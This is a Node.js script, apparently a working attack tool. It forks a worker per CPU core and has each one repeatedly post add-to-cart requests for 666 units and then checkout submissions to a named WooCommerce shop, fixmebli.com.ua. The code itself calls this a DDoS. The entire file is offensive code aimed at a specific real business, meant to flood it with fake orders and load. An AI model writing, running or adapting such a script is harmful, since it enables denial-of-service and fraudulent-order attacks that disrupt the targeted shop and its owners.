const cluster = require('cluster');
const numCPUs = require('os').cpus().length;
const request = require('request');

const logger = require('./logger')
const data = require('./data');

let workers = [];


if (cluster.isMaster) {
    setupWorkerProcesses();
} else {
    ddos(10000 * 6);
}

/**
 * Setup threads according to numbers of processor cores
 */
function setupWorkerProcesses() {
    console.log('Master cluster setting up ' + numCPUs + ' workers');
    for (let i = 0; i < numCPUs; i++) {
        workers.push(cluster.fork());
        workers[i].on('message', (message) => {
            console.log(message);
        });
    }
    cluster.on('exit', (worker, code, signal) => {
        throw new Error(`Worker ${worker.process.pid} died with code: ${code}, and signal: ${signal}`
        );
    });
}

function ddos(timeout) {
    console.log(`DDOS on thread ${process.pid} will start after ${timeout/1000} seconds!`);
    setInterval(async () => {
        try {
            const status = await sendRequest();
            console.log('Status: ', status);
            logger.info(`Response Status: ${status}`)
        } catch (e) {
            console.log('Error: ', e);
            logger.error(e);
        } finally {
            console.log('--------------------------------------');
        }

    }, timeout);
}

function sendRequest() {
    return new Promise((resolve, reject) => {
        request.post({ url: `https://fixmebli.com.ua/?wc-ajax=add_to_cart`, formData: { product_id: 10276, quantity: 666 } }, (err, res, body) => {
            if (err) return reject(err);
            console.log('Shopping cart status: ', res.statusCode);
            if (res && res.statusCode === 200) {
                request.post({ url: `https://fixmebli.com.ua/?wc-ajax=checkout`, formData: data }, (err, res, body) => {
                    if (res.statusCode === 200) {
                        resolve(res.statusCode);
                    } else {
                        reject(res.statusCode);
                    }
                });
            } else {
                reject(res.statusCode);
            }
        });
    });
}